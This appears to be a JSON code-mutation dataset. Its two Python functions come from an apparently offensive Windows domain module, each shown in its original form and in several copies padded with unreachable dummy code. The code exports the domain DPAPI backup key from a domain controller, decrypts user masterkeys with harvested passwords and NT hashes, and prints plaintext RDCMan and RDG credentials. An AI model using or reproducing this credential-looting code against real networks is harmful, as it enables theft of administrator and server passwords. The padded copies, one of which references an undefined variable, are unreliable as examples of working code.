[
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\n        PVK             Domain backup key file\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\n        \"\"\"\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    '\\n        PVK             Domain backup key file\\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\\n        '\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        PVK             Domain backup key file\\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\\n        '\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        PVK             Domain backup key file\\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\\n        '\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        PVK             Domain backup key file\\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\\n        '\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        PVK             Domain backup key file\\n        MKFILE          File with masterkeys in form of {GUID}:SHA1\\n        '\n    self.pvkbytes = None\n    self.masterkeys = None\n    if 'PVK' in module_options:\n        self.pvkbytes = open(module_options['PVK'], 'rb').read()\n    if 'MKFILE' in module_options:\n        self.masterkeys = parse_masterkey_file(module_options['MKFILE'])\n        self.pvkbytes = open(module_options['MKFILE'], 'rb').read()"
        ]
    },
    {
        "func_name": "on_admin_login",
        "original": "def on_admin_login(self, context, connection):\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))",
        "mutated": [
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    host = connection.hostname + '.' + connection.domain\n    domain = connection.domain\n    username = connection.username\n    kerberos = connection.kerberos\n    aesKey = connection.aesKey\n    use_kcache = getattr(connection, 'use_kcache', False)\n    password = getattr(connection, 'password', '')\n    lmhash = getattr(connection, 'lmhash', '')\n    nthash = getattr(connection, 'nthash', '')\n    if self.pvkbytes is None:\n        try:\n            dc = Target.create(domain=domain, username=username, password=password, target=domain, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n            dc_conn = DPLootSMBConnection(dc)\n            dc_conn.connect()\n            if dc_conn.is_admin:\n                context.log.success('User is Domain Administrator, exporting domain backupkey...')\n                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)\n                backupkey = backupkey_triage.triage_backupkey()\n                self.pvkbytes = backupkey.backupkey_v2\n        except Exception as e:\n            context.log.debug('Could not get domain backupkey: {}'.format(e))\n            pass\n    target = Target.create(domain=domain, username=username, password=password, target=host, lmhash=lmhash, nthash=nthash, do_kerberos=kerberos, aesKey=aesKey, no_pass=True, use_kcache=use_kcache)\n    conn = None\n    try:\n        conn = DPLootSMBConnection(target)\n        conn.smb_session = connection.conn\n    except Exception as e:\n        context.log.debug('Could not upgrade connection: {}'.format(e))\n        return\n    plaintexts = {username: password for (_, _, username, password, _, _) in context.db.get_credentials(cred_type='plaintext')}\n    nthashes = {username: nt.split(':')[1] if ':' in nt else nt for (_, _, username, nt, _, _) in context.db.get_credentials(cred_type='hash')}\n    if password != '':\n        plaintexts[username] = password\n    if nthash != '':\n        nthashes[username] = nthash\n    if self.masterkeys is None:\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)\n            self.masterkeys = masterkeys_triage.triage_masterkeys()\n        except Exception as e:\n            context.log.debug('Could not get masterkeys: {}'.format(e))\n    if len(self.masterkeys) == 0:\n        context.log.fail('No masterkeys looted')\n        return\n    context.log.success('Got {} decrypted masterkeys. Looting RDCMan secrets'.format(highlight(len(self.masterkeys))))\n    try:\n        triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)\n        (rdcman_files, rdgfiles) = triage.triage_rdcman()\n        for rdcman_file in rdcman_files:\n            if rdcman_file is None:\n                continue\n            for rdg_cred in rdcman_file.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n        for rdgfile in rdgfiles:\n            if rdgfile is None:\n                continue\n            for rdg_cred in rdgfile.rdg_creds:\n                if rdg_cred.type == 'cred':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'logon':\n                    context.log.highlight('[%s][%s] %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n                elif rdg_cred.type == 'server':\n                    context.log.highlight('[%s][%s] %s - %s:%s' % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))\n    except Exception as e:\n        context.log.debug('Could not loot RDCMan secrets: {}'.format(e))"
        ]
    }
]